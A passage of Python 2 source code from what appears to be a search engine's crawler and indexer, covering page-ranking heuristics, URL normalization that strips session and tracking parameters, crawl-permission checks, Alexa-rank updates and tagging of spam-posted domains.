    elif item.rooturl.endswith(u'.club') or item.rooturl.endswith(u'.guru') or item.rooturl.endswith(u'.ninja') or item.rooturl.endswith(u'.kr') or item.rooturl.endswith(u'.jp') or item.rooturl.endswith(u'.az') or item.rooturl.endswith(u'.iq') or item.rooturl.endswith(u'.ir') or item.rooturl.endswith(u'.name'):
        value -= 4
        if verbose:
            rulematches.append('-4 points for domain .club/.guru/.ninja/.kr/.jp./.az/.iq/.ir/.name')
    elif item.rooturl.endswith(u'.me') or item.rooturl.endswith(u'.biz'):
        value -= 3
        if verbose:
            rulematches.append('-3 points for domain .me/.biz')
    elif item.rooturl.endswith(u'.in') or item.rooturl.endswith(u'.sg') or item.rooturl.endswith(u'.tw') or item.rooturl.endswith('.mobi') or item.rooturl.endswith(u'.ng') or item.rooturl.endswith(u'.my') or item.rooturl.endswith(u'.id') or item.rooturl.endswith(u'.ph') or item.rooturl.endswith(u'.lk') or item.rooturl.endswith(u'.ae') or item.rooturl.endswith(u'.ws') or item.rooturl.endswith(u'.om') or item.rooturl.endswith(u'.kw') or item.rooturl.endswith(u'.th') or item.rooturl.endswith(u'.bn') or item.rooturl.endswith(u'.am') or item.rooturl.endswith(u'.ge') or item.rooturl.endswith(u'.mn') or item.rooturl.endswith(u'.jo') or item.rooturl.endswith(u'.by') or item.rooturl.endswith(u'.la') or item.rooturl.endswith(u'.bt') or item.rooturl.endswith(u'.ae'):
        value -= 2
        if verbose:
            rulematches.append('-2 points for domain .in/.sg/.tw/.mobi/.biz/.ng/.my/.id/.ph/.tw/.sg/.in/.lk/.ae/.ws/.om/.kw/.th/.bn/.am/.ge/.mn/.jo/.by/.la/.bt/.ae')
    elif item.rooturl.endswith(u'.tv') or item.rooturl.endswith(u'.vi') or item.rooturl.endswith(u'.vg') or item.rooturl.endswith(u'.sc') or item.rooturl.endswith(u'.vu') or item.rooturl.endswith(u'.to') or item.rooturl.endswith(u'.tl') or item.rooturl.endswith(u'.nr') or item.rooturl.endswith(u'.sh') or item.rooturl.endswith(u'.pn') or item.rooturl.endswith(u'.tk') or item.rooturl.endswith(u'.tc'):
        value -= 1
        if verbose:
            rulematches.append('-1 points for domain .tv/.vi/.vg/.sc/.vu/.to/.tl/.nr/.sh/.pn/.tk/.tc')
    elif item.rooturl.endswith(u'.net') or item.rooturl.endswith(u'.org') or item.rooturl.endswith(u'.ca') or item.rooturl.endswith(u'.mil') or item.rooturl.endswith(u'.au') or item.rooturl.endswith(u'.uk'):
        value += 1
        if verbose:
            rulematches.append('1 point for domain .net/.org/.ca/.mil/.au/.uk.')
    elif item.rooturl.endswith(u'.com') or item.rooturl.endswith(u'.edu') or item.rooturl.endswith(u'.gov'):
        value += 3
        if verbose:
            rulematches.append('3 points for domain .com/.edu/.gov.')
    # URL Length modifications: <= 28 chars: +2, <= 42 chars: +1, <= 65 chars: NC, <= 98 chars: -1, <= 142 chars: -2, >142 chars: -3
    url_len = len(item.url)
    if url_len <= 28:
        value += 2
        if verbose:
            rulematches.append('2 points for url 28 chars or less.')
    elif url_len <= 42:
        value += 1
        if verbose:
            rulematches.append('1 point for url 42 chars or less.')
    elif url_len <= 65:
        value += 0
        if verbose:
            rulematches.append('0 points for url 65 chars or less.')
    elif url_len <= 98:
        value -= 1
        if verbose:
            rulematches.append('-1 point for url 98 chars or less.')
    elif url_len > 98:
        value -= 2
        if verbose:
            rulematches.append('-2 points for url 98 chars or more.')
    elif url_len > 142:
        value -= 3
        if verbose:
            rulematches.append('-3 points for url 143 chars or more.')
    elif url_len > 220:
        value -= 4
        if verbose:
            rulematches.append('-4 points for url 221 chars or more.')
    #if item.pagetitle and keywords in item.pagetitle.lower():
    if item.pagetitle and keywords in GetTerms(item.pagetitle):
        value += 10
        if verbose:
            rulematches.append('10 points for keyword in page title.')
    elif multiword and item.pagetitle and spacelesskeywords in GetTerms(item.pagetitle):
        value += 8
        if verbose:
            rulematches.append('8 points for spaceless keyword in page title.')
    elif not item.pagetitle:
        value -= 10
        if verbose:
            rulematches.append('-10 points for no page title.')
    # For multiword search terms, give a percentage of 10 points for each keyword found.
    elif item.pagetitle and multiword:
        numwordsfound = 0
        tempterms = GetTerms(item.pagetitle)
        for keyword in splitkeywords:
            if keyword in tempterms:
                numwordsfound += 1
        if numwordsfound:
            value += (10.0 * numwordsfound) / len(splitkeywords)
            if verbose:
                rulematches.append('{0} points for {1} of {2} keywords in page title.'.format((10.0 * numwordsfound) / len(splitkeywords), numwordsfound, len(splitkeywords)))
    else:
        value -= 2
        if verbose:
            rulematches.append('-2 points for keywords not in page title.')
    # Lose points for a long page title (treat it as keyword stuffing)
    if item.pagetitle and len(item.pagetitle) > 160:
        value -= 4
        if verbose:
            rulematches.append('-4 points for page title more than 160 chars.')
    elif item.pagetitle and len(item.pagetitle) > 100:
        value -= 2
        if verbose:
            rulematches.append('-2 points for page title more than 100 chars.')
    # Lose points for a super-short title, but not as bad as no title.
    elif item.pagetitle and len(item.pagetitle) < 4:
        value -= 3
        if verbose:
            rulematches.append('-3 points for page title less than 4 chars.')
    # Lose 2 points for an all-caps title or 1 for an all-lowercase title.
    if item.pagetitle and item.pagetitle.isupper():
        value -= 4
        if verbose:
            rulematches.append('-4 points for all uppercase page title.')
    elif item.pagetitle and item.pagetitle.islower():
        value -= 2
        if verbose:
            rulematches.append('-2 points for all lowercase page title.')
    #if item.pagedescription and keywords in item.pagedescription.lower():
    if item.pagedescription and keywords in GetTerms(item.pagedescription):
        value += 3
        if verbose:
            rulematches.append('3 points for page keyword match.')
    elif multiword and item.pagedescription and spacelesskeywords in GetTerms(item.pagedescription):
        value += 2
        if verbose:
            rulematches.append('2 points for spaceless page keyword match.')
    elif item.pagedescription and len(item.pagedescription) > 40:
        # A point for actually having a description that's a decent length.
        value += 1
        if verbose:
            rulematches.append('1 point for page description over 40 characters.')
    # Lose two points for no page description.
    elif not item.pagedescription:
        value -= 2
        if verbose:
            rulematches.append('-2 points for no page description.')
    # For multiword search terms, give a percentage of 3 points for each keyword found.
    elif item.pagedescription and multiword:
        numwordsfound = 0
        tempterms = GetTerms(item.pagedescription)
        for keyword in splitkeywords:
            if keyword in tempterms:
                numwordsfound += 1
        if numwordsfound:
            value += (3.0 * numwordsfound) / len(splitkeywords)
            if verbose:
                rulematches.append('{0} points for {1} of {2} keywords in description.'.format((10.0 * numwordsfound) / len(splitkeywords), numwordsfound, len(splitkeywords)))
    # Lose a point for an all-uppercase page description and a half point for an all lowercase page description.
    if item.pagedescription and item.pagedescription.isupper():
        value -= 1
        if verbose:
            rulematches.append('-1 point for all uppercase page description.')
    elif item.pagedescription and item.pagedescription.islower():
        value -= 0.5
        if verbose:
            rulematches.append('-0.5 points for all lowercase page description.')
    if item.pagekeywords and keywords in item.pagekeywords:
        value += 1
        if verbose:
            rulematches.append('1 point for page keyword match.')
    elif multiword and item.pagekeywords and spacelesskeywords in item.pagekeywords:
        value += 1
        if verbose:
            rulematches.append('1 points for spaceless page keyword match.')
    #if item.pagefirstheadtag and keywords in item.pagefirstheadtag.lower():
    if item.pagefirstheadtag and keywords in GetTerms(item.pagefirstheadtag):
        value += 8
        if verbose:
            rulematches.append('8 points for page first head tag match.')
    elif multiword and item.pagefirstheadtag and spacelesskeywords in GetTerms(item.pagefirstheadtag):
        value += 6
        if verbose:
            rulematches.append('6 points for spaceless first head tag keyword match.')
    # For multiword search terms, give a percentage of 8 points for each keyword found.
    elif item.pagefirstheadtag and multiword:
        numwordsfound = 0
        tempterms = GetTerms(item.pagefirstheadtag)
        for keyword in splitkeywords:
            if keyword in tempterms:
                numwordsfound += 1
        if numwordsfound:
            value += (8.0 * numwordsfound) / len(splitkeywords)
            if verbose:
                rulematches.append('{0} points for {1} of {2} keywords in first head tag.'.format((10.0 * numwordsfound) / len(splitkeywords), numwordsfound, len(splitkeywords)))
    # No head tag at all means lower score.
    elif not item.pagefirstheadtag:
        value -= 2
        if verbose:
            rulematches.append('-2 points for no page first H1 tag.')
    # H2 tag worth half the points of the H1 tag.
    if item.pagefirsth2tag and keywords in GetTerms(item.pagefirsth2tag):
        value += 4
        if verbose:
            rulematches.append('4 points for keywords in page first h2 tag.')
    elif multiword and item.pagefirsth2tag and spacelesskeywords in GetTerms(item.pagefirsth2tag):
        value += 3
        if verbose:
            rulematches.append('3 points for spaceless keywords in page first h2 tag.')
    if item.pagefirsth3tag and keywords in GetTerms(item.pagefirsth3tag):
        value += 2
        if verbose:
            rulematches.append('2 points for page first h3 tag match.')
    # H3 tag worth half the points of the H2 tag and one quarter the H1 tag.
    elif multiword and item.pagefirsth3tag and spacelesskeywords in GetTerms(item.pagefirsth3tag):
        value += 1
        if verbose:
            rulematches.append('1 point for spaceless keywords in page first h3 tag.')
    # Award points based on the number of times the keyword appears in the page body text.
    if not abbreviated and item.pagetext:
        # If there is a space in the keywords, we use regex-based search.
        if ' ' in keywords:
            num_occurrences = len([m.start() for m in re.finditer(re.escape(keywords), item.pagetext.lower())])
        # If there's no space in the keywords, we can split on spaces and look for exact matches.
        else:
            pagewords = item.pagetext.lower().split(' ')
            num_occurrences = pagewords.count(keywords)
        if num_occurrences == 0:
            value -= 3
            if verbose:
                rulematches.append('-3 points for 0 keywords in page text.')
        elif num_occurrences == 1:
            value += 5
            if verbose:
                rulematches.append('{0} points for {1} keywords in page text.'.format(5, 1))
        elif num_occurrences == 2:
            value += 6
            if verbose:
                rulematches.append('{0} points for {1} keywords in page text.'.format(6, 2))
        elif num_occurrences == 3:
            value += 7
            if verbose:
                rulematches.append('{0} points for {1} keywords in page text.'.format(7, 3))
        elif num_occurrences == 4 or num_occurrences == 5:
            value += 8
            if verbose:
                rulematches.append('{0} points for {1} keywords in page text.'.format(8, '4-5x'))
        elif num_occurrences < 20:
            value += 9
            if verbose:
                rulematches.append('{0} points for {1} keywords in page text.'.format(9, '6-20x'))
        elif num_occurrences > 20:
            value -= 20
            if verbose:
                rulematches.append('{0} points for {1} keywords in page text.'.format(-20, '21+'))
        # Parked domains. Certain text is considered a "park" and those domains get demoted.
        if item.pagetext.startswith('Buy this domain.') or (u'This website is for sale' in item.pagetitle) or (u'The Sponsored Listings displayed above are served automatically by a third party.' in item.pagetext):
            if verbose:
                rulematches.append('Lose half of points for parked domain.')
            value /= 2
    # Short pages, i.e. without much real content, are penalized. Half off under 250 bytes, 1/4 off
    # under 500, no -2 points for 500-1000, and a 1 point bonus for 2000+.
    if item.pagesize < 250:
        value /= 4
        if verbose:
            rulematches.append('Lose 75% of points for page size under 250.')
    elif item.pagesize < 500:
        value /= 2
        if verbose:
            rulematches.append('Lose 50% of points for page size under 500.')
    elif item.pagesize < 1000:
        value = value * 0.75
        if verbose:
            rulematches.append('Lose 25% of points for page size under 1000.')
    elif item.pagesize < 2000:
        value -= 2
        if verbose:
            rulematches.append('Lose 2 points for page size under 2000.')
    # Above this size it can't be anything but a download.
    elif item.pagesize > 10000000:
        value -= 20
        if verbose:
            rulematches.append('-20 points for page size over 10000000.')
    # Almost guaranteed to be a download. Occasionally an HTML file can be larger, but it's very uncommon (~1 per 1 million URLs).
    elif item.pagesize > 2000000:
        value -= 10
        if verbose:
            rulematches.append('-10 points for page size over 2000000.')
    # Inconveniently large HTML files, images, and downloads are above this size.
    elif item.pagesize > 500000:
        value -= 5
        if verbose:
            rulematches.append('-5 points for page size over 500000.')
    elif item.pagesize > 100000:
        value -= 2
        if verbose:
            rulematches.append('-2 points for page size over 100000.')
    elif item.pagesize > 50000:
        value -= 1
        if verbose:
            rulematches.append('-1 point for page size over 50000.')
    elif item.pagesize > 4000:
        value += 1
        if verbose:
            rulematches.append('1 point for page size over 4000.')
    if item.content_type_header:
        pts = GetMimeTypeModifier(item.content_type_header, lang)
        value += pts
        if verbose:
            rulematches.append('{0} points for content type {1}.'.format(pts, item.content_type_header))
    if item.num_errors:
        value -= (item.num_errors * 2)
        if verbose:
            rulematches.append('-{0} points for recent crawl errors retrieving page.'.format(item.num_errors * 2))
    if verbose:
        modifiers = GetIndexModifiersForDomain(item.rooturl, lang, rulematches=rulematches, verbose=True)
        rulematches.append('Domain Modifiers are bonus {0} and multiplier {1}'.format(modifiers[1], modifiers[0]))
    else:
        modifiers = GetIndexModifiersForDomain(item.rooturl, lang)
    value = (value + modifiers[1]) * modifiers[0]
    if verbose:
        rulematches.append('Total Score: {0}'.format(value))
    if verbose:
        return rulematches
    return value

def CopySiteData(site, newsite):
    newsite.rooturl = site.rooturl
    newsite.url = site.url
    newsite.pagetitle = site.pagetitle
    newsite.pagedescription = site.pagedescription
    newsite.pagefirstheadtag = site.pagefirstheadtag
    newsite.pagefirsth2tag = site.pagefirsth2tag
    newsite.pagefirsth3tag = site.pagefirsth3tag
    newsite.pagekeywords = site.pagekeywords
    newsite.pagecontents = site.pagecontents
    newsite.pagetext = site.pagetext
    newsite.pagesize = site.pagesize
    newsite.lastcrawled = site.lastcrawled
    if site.firstcrawled:
        newsite.firstcrawled = site.firstcrawled.replace(tzinfo=utc)
    else:
        newsite.firstcrawled = site.lastcrawled
    newsite.ip = site.ip
    newsite.num_errors = site.num_errors
    newsite.error_info = site.error_info
    newsite.server_header = site.server_header
    newsite.content_type_header = site.content_type_header
    newsite.num_iframes = site.num_iframes
    newsite.num_javascripts = site.num_javascripts
    newsite.num_images = site.num_images 
    newsite.num_css_files = site.num_css_files
    newsite.num_video_tags = site.num_video_tags
    newsite.num_audio_tags = site.num_audio_tags
    newsite.num_svg_tags = site.num_svg_tags
    newsite.num_canvas_tags = site.num_canvas_tags
    newsite.image_alt_tags = site.image_alt_tags
    newsite.image_title_tags = site.image_title_tags
    newsite.image_filenames = site.image_filenames
    return newsite

# Move a site info to the site info table of another language.
# If whole_domain is blank or true, we tag the domain as being in that
# language if it didn't have a language tag already.
# If tag_as_subdir is true, we set "uses language subdirs" flag on that
# domain. uses_language_subdirs is only checked if whole_domain is not true.
def MoveSiteTo(site, language, whole_domain=True, tag_as_subdir=False, verbose=False):
    # Do this first so we can throw an invalid language exception if necessary and
    # avoid tagging the site as an invalid language.
    site_lang = GetSiteInfoModelFromLanguage(language)
    if whole_domain:
        # Set ranked keywords for that domain to reindex.
        existing_model = type(site)
        if verbose:
            print u'MoveSiteTo: Existing model is: {0}'.format(existing_model.__name__)
        # Handle SiteInfo, SiteInfoAfterZ, SiteInfoBeforeZero
        if existing_model.__name__ == 'SiteInfo' or not '_' in existing_model.__name__:
            existlang = 'en'
        else:
            existlang = existing_model.__name__[-2:]
        ranking_model = GetKeywordRankingModelFromLanguage(existlang)
        if verbose:
            print u'MoveSiteTo: Ranking model is: {0}'.format(ranking_model)
        keywords = ranking_model.objects.filter(rooturl=site.rooturl)
        for keyword in keywords:
            if verbose:
                try:
                    print u"MoveSiteTo: Keywords '{0}' added to {1} pending index.".format(keyword.keywords, existlang)
                except:
                    print u"MoveSiteTo: Keywords added to {0} pending index.".format(existlang)
            AddPendingTerm(keyword.keywords, existlang, u'Site {0} moved to {1} and it ranks {2} for {3}'.format(site, language, keyword.rank, keyword.keywords))
        # Set the domain's language. If we're moving a URL parameter or langid page, this is a noop.
        SetDomainLanguage(site.rooturl, language)
    elif tag_as_subdir:
        SetDomainInfixLanguage(site.rooturl)
    newsite = site_lang()
    newsite = CopySiteData(site, newsite)
    try:
        newsite.save()
    except IntegrityError:
        # The only reason we would get an integrity error is if we
        # violate the unique key constraint of the database. If we
        # did that, it means that the URL is already in there and we
        # can safely delete it.
        connection._rollback()
    site.delete(keep_links=True)

# Removes all URLs for that domain. Nukes them from the main site info table,
# and if the domain is tagged with a language, nukes them from that language
# table too.
def RemoveURLsForDomain(rooturl):
    # First we delete from the main pool to get any uncategorized or
    # unprocessed URLs
    SiteInfo.objects.filter(rooturl=rooturl).delete()
    # Now we delete any URLs in the language table specific to that URL,
    # if any.
    try:
        domain = DomainInfo.objects.get(url=rooturl)
        if domain.language_association and domain.language_association != 'en':
            site_model = GetSiteInfoModelFromLanguage(domain.language_association)
            site_model.objects.filter(rooturl=rooturl).delete()
    except ObjectDoesNotExist:
         pass
    # Now we nuke all crawlable URLs.
    CrawlableUrl.objects.filter(rooturl=rooturl).delete()

def IsHtmlUrl(url):
    """
    Returns False if a URL is not HTML - executable files, videos, JavaScript code,
    email links, etc.

    The URL does not have to have a domain and can be relative. This just checks for
    non-HTML urls.
    """
    url = url.lower()
    badextensions = [
                     u'.asm', u'.bat', u'.css', u'.csv', u'.dmg', u'.eps', u'.f4v', u'.git',
                     u'.exe', u'.msi', u'.pdf', u'.xpi', u'.xap', u'.bz2', u'.tar', u'.tgz',
                     u'.mp3', u'.mp4', u'.mkv', u'.jpg', u'.jpeg', u'.gif', u'.png', u'.bmp',
                     u'.gz', u'.zip', u'.webm', u'.rar', u'.rpm', u'.deb', u'.wmv', u'.xml',
                     u'.svg', u'.tif', u'.json', u'.m4a', u'.xsd', u'.3gp', u'.mov', u'.m3u',
                     u'.hqx', u'.ico', u'.pps', u'.ppt', u'.psd', u'.ram', u'.rss', u'.rst',
                     u'.ogg', u'.wav', u'.rm', u'.flv', u'.swf', u'.mpg', u'.mpeg', u'.apk',
                     u'.vcf', u'.md5', u'.jar', '.ttf', u'.otf', u'.dll', u'.iso', u'.rtf',
                     u'.bin', u'.xls', u'.xlsx', u'.doc', u'.docx', u'.dat', u'.avi', u'.pptx',
                     u'.sln', u'.yml', u'.hpp', u'.h2drumkit', u'.m4v', u'.cab', u'.xz',
                     u'.ogv', u'.pup', u'.epub', u'.wma', u'.tiff', u'.owl', u'.ppsx'
                    ]
    for extension in badextensions:
        if url.endswith(extension):
            return False
    if u'javascript:' in url or u'mailto:' in url or 'tel:' in url:
        return False
    if url == '.' or url == '..' or url == './' or url == '../' or url == '~' or url == ':':
        return False
    return True

def IsHtmlExtension(url):
    """
    Returns true if the URL extension is an HTML file extension.

    We're not counting .py (python) and .pl (perl) as definitely HTML extensions because
    they're the TLDs for Paraguay and Poland.
    """
    extensions = [u'.htm', u'.html', u'.php', u'.asp', u'.aspx', u'.jsp', u'.cfm']
    for extension in extensions:
        if url.endswith(extension):
            return True
    return False

def IsDomainBlocked(checkdomain, verbose=False):
    if verbose:
        print u'Checking domain for exclusion: ' + checkdomain
    if checkdomain.endswith('/'):
        checkdomain = checkdomain[0:-1]
    try:
        blocked_domain = BlockedSite.objects.get(url=checkdomain)
        if verbose:
            print checkdomain + u' is a blocked domain.'
        return True
    except ObjectDoesNotExist:
        pass
    try:
        root_domain = GetRootDomain(url=checkdomain)
        if root_domain != checkdomain:
            blocked_domain = BlockedSite.objects.get(url=root_domain)
            if blocked_domain.exclude_subdomains:
                if verbose:
                    print root_domain + u' is a blocked domain with all subdomains blocked.'
                return True
    except ObjectDoesNotExist:
        pass
    if verbose:
        print u'Domain is OK.'
    return False

def DomainLimitReached(checkdomain, verbose=False):
    try:
        domain = DomainInfo.objects.get(url=checkdomain)
        if not domain.max_urls:
            return False
        if verbose:
            print u'Domain max urls: {0}, Language: {1}'.format(domain.max_urls, domain.language_association)
        if domain.language_association:
            site_model = GetSiteInfoModelFromLanguage(domain.language_association)
        else:
            site_model = GetSiteInfoModelFromLanguage('en')
        total = site_model.objects.filter(rooturl=checkdomain).count()
        if verbose:
            print u'Number of domain urls: {0}'.format(total)
        if domain.max_urls and (total >= domain.max_urls):
            return True
    except ObjectDoesNotExist:
        pass
    return False

def NormalizeUrl(url, pre_crawl_replacement=False, post_crawl_replacement=False, secure=False):
    """
    Note that we're specifically NOT using unicode strings here because urllib just dies on them.
    """
    if url.startswith('//'):
        if secure:
            url = 'https:' + url
        else:
            url = 'http:' + url
    # Remove Tomcat session IDs if there are idiots who have managed to set up stupid URLs.
    url = re.sub(';jsessionid=.*?(?=\\?|$)','', url)
    url = re.sub('jsessionid=.*?(?=\\?|$)','', url)
    parsedurl = urlparse.urlparse(url)
    if parsedurl.query:
        queryparams = dict(urlparse.parse_qsl(parsedurl.query))
        if queryparams.has_key('PHPSESSID'):
            del queryparams['PHPSESSID']
        if queryparams.has_key('sid'):
            del queryparams['sid']
        if queryparams.has_key('SID'):
            del queryparams['SID']
        if queryparams.has_key('___SID'):
            del queryparams['___SID']
        if queryparams.has_key('ID'):
            del queryparams['ID']
        if queryparams.has_key('jsessionid'):
            del queryparams['jsessionid']
        if queryparams.has_key('sessionid'):
            del queryparams['sessionid']
        if queryparams.has_key('force_sid'):
            del queryparams['force_sid']
        if queryparams.has_key('zenid'):
            del queryparams['zenid']
        if queryparams.has_key('sessid'):
            del queryparams['sessid']
        if queryparams.has_key('sess'):
            del queryparams['sess']
        if queryparams.has_key('ses'):
            del queryparams['ses']
        if queryparams.has_key('Sess'):
            del queryparams['Sess']
        if queryparams.has_key('SESSION'):
            del queryparams['SESSION']
        if queryparams.has_key('osCsid'):
            del queryparams['osCsid']
        if queryparams.has_key('eSID'):
            del queryparams['eSID']
        if queryparams.has_key('XTCsid'):
            del queryparams['XTCsid']
        if queryparams.has_key('MODsid'):
            del queryparams['MODsid']
        if queryparams.has_key('session_id'):
            del queryparams['session_id']
        if queryparams.has_key('Session_ID'):
            del queryparams['Session_ID']
        if queryparams.has_key('ASPSESSIONID'):
            del queryparams['ASPSESSIONID']
        if queryparams.has_key('utm_source'):
            del queryparams['utm_source']
        if queryparams.has_key('utm_medium'):
            del queryparams['utm_medium']
        if queryparams.has_key('utm_campaign'):
            del queryparams['utm_campaign']
        if queryparams.has_key('utm_term'):
            del queryparams['utm_term']
        if queryparams.has_key('utm_content'):
            del queryparams['utm_content']
        if queryparams.has_key('s'):
            param = queryparams['s']
            if len(param) == 32:
                del queryparams['s']
        if post_crawl_replacement or pre_crawl_replacement:
            params = QueryParameter.objects.filter(domain=parsedurl.netloc)
            numparams = params.count()
            if numparams > 0:
                for param in params:
                    if pre_crawl_replacement and param.remove_before_crawl and queryparams.has_key(param.parameter):
                        del queryparams[param.parameter]
                    elif pre_crawl_replacement and param.replace_before_crawl:
                        queryparams[param.parameter] = param.replace_with
                    elif post_crawl_replacement and param.remove_or_replace_after_crawl:
                        #print u'Deleting {0} from URL'.format(param.parameter)
                        if queryparams.has_key(param.parameter) and not param.replace_with:
                            del queryparams[param.parameter]
                        elif param.replace_with:
                            queryparams[param.parameter] = param.replace_with
        if len(queryparams) > 0:
            #try:
            newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params + '?' + urllib.urlencode(queryparams)
            #except ValueError:
            #    print u'ValueError encoding query params, using URL without query.'
            #    newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params
            #    print u'Was: {0}, Now: {1}'.format(url, newurl)
        else:
            if parsedurl.scheme:
                newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params
            else:
                newurl = 'http://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params
    else:
        if parsedurl.scheme:
            newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params
        else:
            newurl = 'http://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params
    return newurl

def CanCrawlUrl(url, verbose=False):
    if not CanReCrawlUrl(url, verbose):
        return False
    if verbose:
        print u'Testing CanCrawlURL for: ' + url
    # Check 'no new urls' setting for domain extension.
    rooturl = GetRootUrl(url)
    try:
        domain = None
        try:
            domain = DomainInfo.objects.get(url=rooturl)
        except ObjectDoesNotExist:
            pass
        # We can only crawl "no new url" domains if it's tagged with a valid
        # language int a DomainInfo record. For instance, we couldn't crawl a
        # new somesite.cn domain, but we could crawl english.somesite.cn if it
        # were specifically allowed.
        if not domain or not domain.language_association:
            suffix = GetDomainExtension(rooturl)
            extension = DomainSuffix.objects.get(extension=suffix)
            if extension.no_new_domain_urls:
                return False
    except ObjectDoesNotExist:
        pass
    # We only count domain limit on crawl, not recrawl.
    if DomainLimitReached(rooturl, verbose):
        return False
    return True

# Checks whether we can recrawl a URL.
# This is CanCrawlUrl minus no new domain urls and domain limit checking.
def CanReCrawlUrl(url, verbose=False):
    if verbose:
        try:
            print u'Testing CanReCrawlURL for: ' + url
        except:
            print u'URL is unprintable. Weird.'
    if not IsHtmlUrl(url):
        if verbose:
            print u'This is not an HTML URL.'
        return False
    rooturl = GetRootUrl(url)
    if IsDomainBlocked(rooturl, verbose):
        if verbose:
            print u'This domain is blocked'
        return False
    # Check "only root domain" crawl
    try:
        di = DomainInfo.objects.get(url=rooturl)
        if di.only_crawl_rooturl:
            if verbose:
                print u'This domain has only crawl root url set.'
            if url != rooturl and url != (rooturl + u'/') and url != (u'http://' + rooturl) and url != (u'https://' + rooturl) and url != (u'http://' + rooturl + u'/') and url != (u'https://' + rooturl + u'/'):
               if verbose:
                   print u'Cannot crawl url because this domain has only crawl root url set and this is not the root url.'
               return False
    except:
        pass
    return True

def UpdateAlexaRank(domain_name, rank):
    """
    Updates the alexa rank for a site and for its www version (assuming it exists).
    Returns True if the site needs to be crawled, false otherwise.
    """
    try:
        domain = DomainInfo.objects.get(url=domain_name)
        domain.alexa_rank = rank
        domain.alexa_rank_date = datetime.date.today()
        domain.alexa_outdated = False
        domain.save()
        # Update the www. version or non-www. version of the domain if it exists.
        # Consider both to be the same thing and make them match.
        try:
            if not domain.url.startswith('www.'):
                domain = DomainInfo.objects.get(url='www.'+ domain_name)
                domain.alexa_rank = rank
                domain.alexa_rank_date = datetime.date.today()
                domain.alexa_outdated = False
                domain.save()
            else:
                domain = DomainInfo.objects.get(url=domain_name[4:])
                domain.alexa_rank = rank
                domain.alexa_rank_date = datetime.date.today()
                domain.alexa_outdated = False
                domain.save()
        except ObjectDoesNotExist:
            pass
    except ObjectDoesNotExist:
        # Create the domain if it doesn't exist. Do this even for blocked sites
        # because they will probably eventually migrate to the SiteInfo table.
        domain = DomainInfo()
        domain.url = domain_name
        domain.alexa_rank = rank
        domain.alexa_rank_date = datetime.date.today()
        domain.alexa_outdated = False
        domain.save()
        try:
            # Update the www. version or non-www. version of the domain if it exists.
            try:
                if not domain.url.startswith('www.'):
                    domain = DomainInfo.objects.get(url='www.'+ domain_name)
                    domain.alexa_rank = rank
                    domain.alexa_rank_date = datetime.date.today()
                    domain.alexa_outdated = False
                    domain.save()
                else:
                    domain = DomainInfo.objects.get(url=domain_name[4:])
                    domain.alexa_rank = rank
                    domain.alexa_rank_date = datetime.date.today()
                    domain.alexa_outdated = False
                    domain.save()
            except ObjectDoesNotExist:
                pass
            # If we haven't seen this URL in a pending import, add it to the
            # to-be-crawled list so it eventually makes it into the index.
            # But only if it's not blocked.
            try:
                blocked_domain = BlockedSite.objects.get(url=domain_name)
            except ObjectDoesNotExist:
                # Exception on a get means that it wasn't found in the block list.
                url = CrawlableUrl()
                url.url = domain_name
                url.rooturl = GetRootUrl(url.url)
                try:
                    url.save()
                except DatabaseError:
                    connection._rollback()
                return True
        except DatabaseError:
            connection._rollback()
    return False

def MarkURLContentsAsSpam(html, ip=None):
    soup = BeautifulSoup(html)
    domains = []
    for link in soup.find_all('a'):
        hr = link.get('href')
        #print 'Found URL: ' + hr
        rooturl = GetRootUrl(hr)
        #print 'Tag domain as spam: ' + rooturl
        if rooturl not in domains:
            domains.append(rooturl)
    for dom in domains:
        try:
            domain = DomainInfo.objects.get(url=dom)
            if not domain.notes:
                domain.notes = 'Spam link(s) posted by bot.'
            if domain.rank_adjustment > -2:
                domain.rank_adjustment = -2
                domain.rank_reason = 7
            domain.save()
        except ObjectDoesNotExist:
            domain = DomainInfo()
            domain.url = dom
            if not domain.notes:
                domain.notes = 'Spam link(s) posted by bot.'
            if domain.rank_adjustment > -2:
                domain.rank_adjustment = -2
                domain.rank_reason = 7
            domain.save()
    if ip:
        try:
            address = IPAddress.objects.get(ip=ip)
            if address.spam_commenter:
                return
        except ObjectDoesNotExist:
            address = IPAddress()
            address.ip = ip
        address.spam_commenter = True
        address.save()

def SetDomainLanguage(url, language):
    """
    Sets the language on a domain if it's already set. Will not override an existing language tag,
    nor will it set it on a domain that is set to use langid or a language query parameter to determine
    its language.

    This makes it safe to move pages tagged langid or infix without screwing up that site's language
    settings.
    """
    try:
        domain = DomainInfo.objects.get(url=url)
        if not domain.language_association and not domain.uses_language_query_parameter and not domain.uses_langid:
            domain.language_association = language
            domain.save()
    except ObjectDoesNotExist:
        domain = DomainInfo()
        domain.url = url
        domain.language_association = language
        domain.save()

def SetDomainInfixLanguage(url):
    """
    Sets a domain to use an infix (in-url) language tag, like http://site.com/de/bild/

    This is set via the uses_language_subdirs variable on a DomainInfo.

    Overrides an existing language tag if it has one.
    """
    try:
        domain = DomainInfo.objects.get(url=url)
        domain.language_association = ''
        domain.uses_language_subdirs = True
        domain.uses_langid = False
        domain.uses_language_query_parameter = False
        domain.save()
    except ObjectDoesNotExist:
        domain = DomainInfo()
        domain.url = url
        domain.language_association = ''
        domain.uses_language_subdirs = True
        domain.uses_langid = False
        domain.uses_language_query_parameter = False
        domain.save()

def BuildJsonIndex(language='en', limit=None, only_empty=True, sleep=0):
    index_model = GetIndexModelFromLanguage(language)
    terms = index_model.objects.all().order_by('date_indexed')
    if only_empty:
        terms = terms.filter(search_results__isnull=True)
    term_count = terms.count()
    x = 0
    cumulative = 0
    for term in terms:
        x = x + 1
        if limit and x > limit:
            print 'Reached limit of ' + str(limit) + ', exiting.'
            return
        print 'Importing term ' + str(x) + ' of ' + str(term_count) + ': ' + term.keywords
        JsonifyIndexTerm(term, language)
        size = len(term.search_results)
        cumulative = cumulative + size
        if sleep:
            time.sleep(sleep)
        print 'Search results size: ' + str(size) + ', Total Size: ' + str(cumulative)

# Requires an IndexTerm, will JSONify and save its search rankings.
def JsonifyIndexTerm(term, language='en', save=True, limit=500, verbose=False):
    site_model = GetSiteInfoModelFromLanguage(language)
    # Get ourselves a list of list pairs.
